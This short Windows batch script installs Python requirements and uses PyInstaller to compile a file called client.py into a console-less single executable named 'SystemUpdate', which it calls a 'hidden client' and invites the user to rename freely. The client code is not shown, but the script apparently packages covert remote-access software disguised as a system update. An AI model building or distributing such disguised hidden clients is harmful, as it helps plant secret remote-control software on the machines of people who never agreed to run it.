@echo off
echo Installing requirements...
pip install -r requirements.txt

echo Building hidden client...
pyinstaller --noconsole --onefile --hidden-import=engineio.async_drivers.threading --hidden-import=websocket --name "SystemUpdate" client.py

echo.
echo Build complete!
echo The hidden client executable is located at: dist\SystemUpdate.exe
echo You can rename it to anything you want.
pause
